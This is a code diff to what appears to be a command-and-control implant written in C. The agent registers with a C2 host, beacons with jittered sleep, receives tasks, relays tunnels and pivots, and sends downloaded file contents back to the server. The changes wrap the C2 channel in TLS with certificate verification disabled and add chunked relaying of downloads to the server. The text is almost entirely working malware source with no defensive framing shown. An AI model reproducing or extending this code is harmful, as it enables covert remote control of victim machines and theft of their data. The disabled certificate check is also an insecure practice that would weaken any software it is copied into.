@@ -22,6 +22,61 @@
 #include <netdb.h>
 #include <arpa/inet.h>
 
+/* ===== OpenSSL TLS ===== */
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+
+static SSL_CTX *g_ssl_ctx = NULL;
+static SSL     *g_ssl     = NULL;
+
+static int tls_init(void)
+{
+    if (g_ssl_ctx) return 0;
+    SSL_library_init();
+    SSL_load_error_strings();
+    OpenSSL_add_all_algorithms();
+    g_ssl_ctx = SSL_CTX_new(TLS_client_method());
+    if (!g_ssl_ctx) return -1;
+    SSL_CTX_set_verify(g_ssl_ctx, SSL_VERIFY_NONE, NULL);
+    SSL_CTX_set_mode(g_ssl_ctx, SSL_MODE_AUTO_RETRY);
+    return 0;
+}
+
+static void tls_cleanup(void)
+{
+    if (g_ssl) { SSL_shutdown(g_ssl); SSL_free(g_ssl); g_ssl = NULL; }
+}
+
+static int tls_send_exact(const uint8_t *buf, uint32_t len)
+{
+    uint32_t sent = 0;
+    while (sent < len) {
+        int r = SSL_write(g_ssl, buf + sent, (int)(len - sent));
+        if (r <= 0) {
+            int err = SSL_get_error(g_ssl, r);
+            if (err == SSL_ERROR_WANT_WRITE) continue;
+            return -1;
+        }
+        sent += (uint32_t)r;
+    }
+    return 0;
+}
+
+static int tls_recv_exact(uint8_t *buf, uint32_t len)
+{
+    uint32_t got = 0;
+    while (got < len) {
+        int r = SSL_read(g_ssl, buf + got, (int)(len - got));
+        if (r <= 0) {
+            int err = SSL_get_error(g_ssl, r);
+            if (err == SSL_ERROR_WANT_READ) continue;
+            return -1;
+        }
+        got += (uint32_t)r;
+    }
+    return 0;
+}
+
 /* forward declarations from Core */
 int nax_encrypt(const uint8_t *, const uint8_t *, uint32_t, uint8_t *, uint32_t *);
 int nax_decrypt(const uint8_t *, const uint8_t *, uint32_t, uint8_t *, uint32_t *);
@@ -117,32 +172,15 @@ static void gen_session_id(char *out)
 /* ===== TCP send exactly len bytes ===== */
 static int tcp_send_exact(int sock, const uint8_t *buf, uint32_t len)
 {
-    uint32_t sent = 0;
-    while (sent < len) {
-        ssize_t r = send(sock, buf + sent, len - sent, MSG_NOSIGNAL);
-        if (r <= 0) {
-            if (r < 0 && (errno == EINTR || errno == EAGAIN)) continue;
-            return -1;
-        }
-        sent += (uint32_t)r;
-    }
-    return 0;
+    (void)sock;
+    return tls_send_exact(buf, len);
 }
 
 /* ===== TCP recv exactly len bytes ===== */
 static int tcp_recv_exact(int sock, uint8_t *buf, uint32_t len)
 {
-    uint32_t got = 0;
-    while (got < len) {
-        ssize_t r = recv(sock, buf + got, len - got, 0);
-        if (r <= 0) {
-            if (r < 0 && errno == EINTR) continue;
-            /* EAGAIN/EWOULDBLOCK = SO_RCVTIMEO fired — propagate to caller */
-            return -1;
-        }
-        got += (uint32_t)r;
-    }
-    return 0;
+    (void)sock;
+    return tls_recv_exact(buf, len);
 }
 
 /* ===== length-prefix send: [4 LE][data] ===== */
@@ -360,9 +398,11 @@ static int handle_server_data(NaxAgent *a, uint8_t *raw, uint32_t raw_len)
     return 0;
 }
 
-/* ===== TCP connect ===== */
+/* ===== TCP connect + TLS handshake ===== */
 static int tcp_connect(NaxAgent *a)
 {
+    if (tls_init() < 0) return -1;
+
     char port_str[8];
     snprintf(port_str, sizeof(port_str), "%u", (unsigned)a->cfg.c2_port);
 
@@ -383,6 +423,19 @@ static int tcp_connect(NaxAgent *a)
         return -1;
     }
     freeaddrinfo(res);
+
+    /* TLS handshake */
+    tls_cleanup(); /* free any previous SSL object */
+    g_ssl = SSL_new(g_ssl_ctx);
+    if (!g_ssl) { close(sock); return -1; }
+    SSL_set_fd(g_ssl, sock);
+    SSL_set_tlsext_host_name(g_ssl, a->cfg.c2_host); /* SNI */
+    if (SSL_connect(g_ssl) <= 0) {
+        tls_cleanup();
+        close(sock);
+        return -1;
+    }
+
     a->sock = sock;
     return 0;
 }
@@ -534,18 +587,60 @@ void nax_tcp_main(NaxAgent *a)
         /* Register */
         if (do_register(a) < 0) {
             DBG("REGISTER failed");
+            tls_cleanup();
             close(a->sock); a->sock = -1;
             sleep_ms(2000);
             continue;
         }
 
         DBG("REGISTER sent OK — entering task loop");
-        /* Task loop — TCP is interactive: send heartbeat, block until response.
-         * NO sleep — recv blocks naturally until server responds.
-         * Sleep only applies to HTTPS polling mode (handled in https.c). */
+        /* Task loop — TCP connect-out: send heartbeat, block until response,
+         * then sleep for configured interval before next cycle.
+         * tcp_bind has no sleep — it is event-driven by the parent socket. */
         while (a->running) {
 
-           /* Process tunnels and pivots before heartbeat */
+            /* Relay download chunks (one chunk per active download per cycle) */
+            /* TCP cap is 256 KB — TCP buffers can't handle 10 MB frames */
+            if (a->download_head) {
+                uint32_t cap = 256 * 1024 + 64;
+                uint8_t *dbuf = (uint8_t *)malloc(cap);
+                if (dbuf) {
+                    uint32_t total = nax_process_downloads(a, dbuf, cap);
+                    /* Parse packed entries: [taskId(4)][dataLen(4)][data] */
+                    uint32_t off = 0;
+                    while (off + 8 <= total) {
+                        uint32_t tid  = (uint32_t)dbuf[off]   | ((uint32_t)dbuf[off+1]<<8)
+                                      | ((uint32_t)dbuf[off+2]<<16) | ((uint32_t)dbuf[off+3]<<24);
+                        uint32_t dlen = (uint32_t)dbuf[off+4] | ((uint32_t)dbuf[off+5]<<8)
+                                      | ((uint32_t)dbuf[off+6]<<16) | ((uint32_t)dbuf[off+7]<<24);
+                        off += 8;
+                        if (off + dlen > total) break;
+                        uint32_t frame_cap = dlen + 256;
+                        uint8_t *frame = (uint8_t *)malloc(frame_cap);
+                        if (frame) {
+                            uint32_t frame_len = frame_cap;
+                            if (nax_build_result(tid, NAX_STATUS_OK, dbuf + off, dlen, frame, &frame_len) == 0)
+                                send_encrypted(a, frame, frame_len);
+                            free(frame);
+                        }
+                        off += dlen;
+                    }
+                    free(dbuf);
+                }
+            }
+
+            /* Sleep before heartbeat (TCP connect-out only).
+             * tcp_bind is event-driven by parent — no sleep. */
+            {
+                uint32_t slp = effective_sleep_ms(a);
+                if (slp > 0) {
+                    DBG("sleeping %u ms (configured=%u jitter=%u%%)",
+                        slp, a->cfg.sleep_ms, a->cfg.jitter_pct);
+                    sleep_ms(slp);
+                }
+            }
+
+            /* Process tunnels and pivots before heartbeat */
             relay_tunnels(a);
             process_pivots(a);
 
@@ -554,9 +649,7 @@ void nax_tcp_main(NaxAgent *a)
             DBG("sending HEARTBEAT");
             if (do_heartbeat(a) < 0) { DBG("HEARTBEAT send failed"); break; }
 
-            /* Block on recv — server always responds with TASKS or NO_TASKS.
-             * Use a generous timeout (30s) as watchdog only; the server
-             * responds immediately so this should never fire. */
+            /* Block on recv — server responds with TASKS or NO_TASKS. */
             {
                 struct timeval tv = { 30, 0 };
                 setsockopt(a->sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
@@ -567,7 +660,6 @@ void nax_tcp_main(NaxAgent *a)
             int recv_rc = tcp_recv(a->sock, &raw, &raw_len);
             if (recv_rc < 0) {
                 if (errno == EAGAIN || errno == EWOULDBLOCK) {
-
                     DBG("recv timeout (watchdog)");
                     break;
                 }
@@ -583,6 +675,7 @@ void nax_tcp_main(NaxAgent *a)
             relay_tunnels(a);
         }
 
+        tls_cleanup();
         close(a->sock);
         a->sock = -1;
         sleep_ms(2000);
